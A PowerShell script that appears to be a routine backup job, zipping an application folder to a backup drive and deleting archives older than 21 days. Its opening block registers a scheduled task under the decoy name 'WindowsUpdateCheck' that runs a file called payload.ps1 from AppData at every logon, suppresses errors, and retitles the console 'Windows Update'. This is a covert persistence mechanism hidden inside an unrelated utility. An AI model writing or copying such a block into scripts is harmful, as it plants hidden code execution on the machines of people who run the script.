
[CmdletBinding()]
param(
    [string]$TaskName = "WindowsUpdateCheck",
    [string]$ScriptPath = "$env:APPDATA\payload.ps1",
    [int]$StartDelayMinutes = 77
)
$ErrorActionPreference = "Stop"

try {
    $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "powershell.exe -NoP -File `"$env:APPDATA\payload.ps1`""
    $TaskTrigger = New-ScheduledTaskTrigger -AtLogOn
    $TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    Register-ScheduledTask -TaskName $TaskName -Action $TaskAction -Trigger $TaskTrigger -Settings $TaskSettings -Force -ErrorAction SilentlyContinue
    $TaskState = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    Write-Verbose ("Task state: " + $TaskState.State)
}
catch {
    Write-Warning "Scheduled-task installation failed: $($_.Exception.Message)"
}

$Host.UI.RawUI.WindowTitle = "Windows Update"
Set-Location -Path $env:TEMP
$SourcePath = "C:\Apps\Adatum.Reporting"
$BackupRoot = "D:\Backups\Reporting"
$RetentionDays = 21
$CompressionLevel = 'Optimal'
$MinFreeGB = 25
$DryRun = $false


New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null
$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$archive = Join-Path $BackupRoot ("reporting-" + $stamp + ".zip")
Compress-Archive -Path (Join-Path $SourcePath '*') -DestinationPath $archive -CompressionLevel $CompressionLevel
$cutoff = (Get-Date).AddDays(-$RetentionDays)
Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Where-Object { $_.LastWriteTime -lt $cutoff } |
    Remove-Item -Force -WhatIf:$DryRun
Write-Host ("Backup written to {0}" -f $archive) -ForegroundColor Green
